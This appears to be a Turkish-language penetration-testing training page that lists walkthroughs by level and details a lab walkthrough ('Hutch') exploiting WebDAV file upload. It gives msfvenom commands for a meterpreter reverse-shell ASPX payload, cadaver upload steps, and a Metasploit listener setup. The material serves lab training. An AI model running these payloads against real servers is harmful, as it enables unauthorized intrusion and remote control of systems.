---
layout: page
title: Walkthroughs
permalink: /walkthroughs/
---

# 🎯 Walkthroughs & Case Studies

Bu sayfa, gerçek senaryolara dayalı adım adım rehberler ve penetrasyon testi case study'lerini içermektedir.

---

## 📚 Başlangıç

Walkthroughs'lar, teorik bilginin pratik uygulamasını gösteren, baştan sona tamamlanmış penetrasyon testi senaryolarıdır.

### Her Walkthrough İçerir:
- 🎯 **Senaryo** - Test edilen sistem ve hedefler
- 🔍 **Keşif Aşaması** - Bilgi toplama ve zayıflık bulma
- ⚔️ **Saldırı Aşaması** - Zayıflıklardan faydalanma
- 📈 **Privilege Escalation** - Yetkilerini artırma
- 🏁 **Post-Exploitation** - Sistem kontrolü

---

## 🔴 Başlangıç Seviyesi (Beginner)

Temel penetrasyon testi konseptlerini öğrenen takımlar için:

| Walkthrough | Konu | Zorluk |
|------------|------|--------|
| [Hutch - WebDAV Exploitation](#hutch) | WebDAV Dosya Yükleme | 🟢 Kolay |
| TBD | Basit Privilege Escalation | 🟢 Kolay |
| TBD | LDAP Enumeration | 🟢 Kolay |

---

## 🟠 Orta Seviye (Intermediate)

Orta düzeyde sistem bilgisine sahip takımlar için:

| Walkthrough | Konu | Zorluk |
|------------|------|--------|
| TBD | Active Directory Lateral Movement | 🟡 Orta |
| TBD | Kerberos Exploitation | 🟡 Orta |
| TBD | Living off the Land (LOLBins) | 🟡 Orta |

---

## 🔴 İleri Seviye (Advanced)

Derinlemesine sistem bilgisine sahip takımlar için:

| Walkthrough | Konu | Zorluk |
|------------|------|--------|
| TBD | Domain Controller Compromise | 🔴 Zor |
| TBD | Evasion & Obfuscation Teknikleri | 🔴 Zor |
| TBD | Red Team Operasyonu Simülasyonu | 🔴 Zor |

---

## 🎯 Detailed Walkthroughs

### Hutch

#### 📌 Senaryo
Hutch makinesinde WebDAV servisi etkin durumdadır. Bu zafiyet, saldırganın dosya yükleme işlemleri yoluyla web uygulamasına doğrudan erişim sağlamasını mümkün kılmaktadır.

#### 🔍 Keşif Aşaması

**Target belirleme:**
```bash
# Target makinenin IP adresini belirle
ping target.com
```

**Port taraması:**
```bash
nmap -sV target.com
```

WebDAV servisi tipik olarak HTTP (80) veya HTTPS (443) üzerinde çalışmaktadır.

#### ⚔️ Saldırı Aşaması - WebDAV Exploitation

**Cadaver kullanarak WebDAV'a erişim:**

```bash
# Attacker machine'den WebDAV'a bağlan
cadaver http://target.com/webdav/
```

Bağlantı kurulduktan sonra prompt açılacaktır:
```
dav:/target.com/webdav/> 
```

**Mevcut dosyaları listele:**
```bash
ls
```

**Dosya yükle:**
```bash
# Shell dosyasını yükle
put shell.aspx

# Başarılı yükleme mesajı
201 Created: http://target.com/webdav/shell.aspx
```

**Web uygulamasından erişim:**

Yüklenen dosya direkt web uygulamasının dizinine gitmektedir:
```
http://target.com/shell.aspx
```

Browser'dan bu URL'ye erişerek yüklenen shell dosyasını çalıştırabilirsiniz.

#### 💻 Örnek: Reverse Shell Yükleme

**Attacker makinesi - Shell oluştur:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.XX LPORT=4444 -f aspx -o shell.aspx
```

**Cadaver ile yükle:**
```bash
cadaver http://target.com/webdav/
dav:/target.com/webdav/> put shell.aspx
Copying from shell.aspx: 201 Created: http://target.com/webdav/shell.aspx
```

**Attacker tarafında listener başlat:**
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.49.XX
set LPORT 4444
exploit
```

**Target'ta çalıştır:**
```
http://target.com/shell.aspx
```

#### 🛡️ Kontrol

Eğer meterpreter session açıldıysa başarılı demektir:
```
Meterpreter session opened
```

#### 🔧 Troubleshooting

| Hata | Çözüm |
|------|-------|
| `401 Unauthorized` | Credentials kontrol et, varsayılan credentials dene |
| `405 Method Not Allowed` | WebDAV PUT method'u devre dışı olabilir |
| `403 Forbidden` | Dosya yükleme dizini protekteli, farklı dizin dene |
| Shell çalışmıyor | Web uygulamasının dosya uzantısını destekleyip desteklemediğini kontrol et |

#### 📋 Kontrol Listesi

- [ ] Target'te WebDAV servisi çalışıyor mu?
- [ ] Cadaver ile WebDAV'a bağlandım
- [ ] Dosya yükleyebiliyorum
- [ ] Yüklenen dosyaya web'den erişebiliyorum
- [ ] Shell dosyası çalışıyor
- [ ] Reverse shell bağlantısı kurdum

---

## 🛠️ Araçlar & Kaynaklar

Her walkthrough'da kullanılan araçlar:

### Penetrasyon Testi Araçları
- **Nmap** - Port ve servis taraması
- **Metasploit** - Exploit ve payload'lar
- **Mimikatz** - Credential dumping
- **BloodHound** - AD mapping
- **Burp Suite** - Web uygulaması testi

### İşletim Sistemleri
- **Kali Linux** - Attacker makinesi
- **Windows Server** - Target sistemi
- **Ubuntu/Debian** - Alternative Linux targets

---

## 📋 Kontrol Listesi

Bir walkthrough başlamadan önce kontrol edin:

- [ ] Tüm araçlar yüklü mü?
- [ ] Test ortamı hazır mı? (sanal makina, lab, vb.)
- [ ] Network bağlantısı doğru mu?
- [ ] Yedekler alındı mı?
- [ ] İzinli bir test ortamında mı çalışıyoruz?

---

## 🚀 Başlarken

1. **Seviyelendirilmiş Sırada İlerleyin** - Beginner → Intermediate → Advanced
2. **Not Alın** - Her adımı dokümante edin
3. **Deneyin** - Rehberi takip etmeden kendiniz deneyin
4. **Karşılaştırın** - Sonra rehberi karşılaştırın
5. **Repeat** - Tüm adımları anlayana kadar tekrarlayın

---

## 📝 Katkıda Bulunma

Yeni walkthroughs eklemek için:
1. Detaylı senaryo yazın
2. Adım adım komutlar ekleyin
3. Output örnekleri sağlayın
4. Sorun giderme ipuçları ekleyin

---

## 📚 İlgili Sayfalar

- [Windows Rehberi](/windows/)
- [Linux Rehberi](/linux/)
- [Active Directory Basics](/windows/ad-basics/)
- [Privilege Escalation](/windows/privesc/)

---

**Son Güncelleme:** 2026-06-16
